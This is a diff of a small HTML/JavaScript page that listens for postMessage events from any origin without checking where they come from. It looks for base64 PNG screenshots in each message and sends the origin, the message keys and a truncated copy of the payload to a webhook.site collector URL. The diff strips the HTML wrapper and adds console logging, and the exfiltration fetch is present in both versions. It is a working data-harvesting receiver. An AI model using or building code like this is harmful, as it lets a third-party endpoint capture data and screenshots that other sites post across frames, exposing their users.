@@ -1,41 +1,37 @@
-<!DOCTYPE html>
-<html>
-  <body>
-    <h1>Receiver Loaded</h1>
-    <script>
-      const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322"; // Replace
+<script>
+  const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322"; // Replace
 
-      function deepFindScreenshot(obj) {
-        const str = JSON.stringify(obj);
-        const match = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/);
-        return match ? match[0] : null;
-      }
+  function deepFindScreenshot(obj) {
+    const str = JSON.stringify(obj);
+    const match = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/);
+    return match ? match[0] : null;
+  }
 
-      window.addEventListener("message", (e) => {
-        try {
-          const payload = e.data;
-          const origin = e.origin;
-          const keys = Object.keys(payload || {});
-          const screenshot = deepFindScreenshot(payload);
+  window.addEventListener("message", (e) => {
+    try {
+      const payload = e.data;
+      const origin = e.origin;
+      const keys = Object.keys(payload || {});
+      const screenshot = deepFindScreenshot(payload);
 
-          fetch(webhookURL, {
-            method: "POST",
-            mode: "no-cors",
-            body: JSON.stringify({
-              timestamp: new Date().toISOString(),
-              origin,
-              keys,
-              containsScreenshot: !!screenshot,
-              truncated: JSON.stringify(payload).slice(0, 1000)
-            })
-          });
+      // 🔍 Add these logs:
+      console.log("📥 Message received from", origin);
+      console.log("🔑 Keys:", keys);
+      console.log("🖼️ Screenshot base64?", !!screenshot);
 
-          // Removed alert() entirely
-          console.log("📥 Message received. Keys:", keys);
-        } catch (err) {
-          console.error("Error processing message:", err);
-        }
-      }, false);
-    </script>
-  </body>
-</html>
+      fetch(webhookURL, {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify({
+          timestamp: new Date().toISOString(),
+          origin,
+          keys,
+          containsScreenshot: !!screenshot,
+          truncated: JSON.stringify(payload).slice(0, 1000)
+        })
+      });
+    } catch (err) {
+      console.error("Error processing message:", err);
+    }
+  }, false);
+</script>
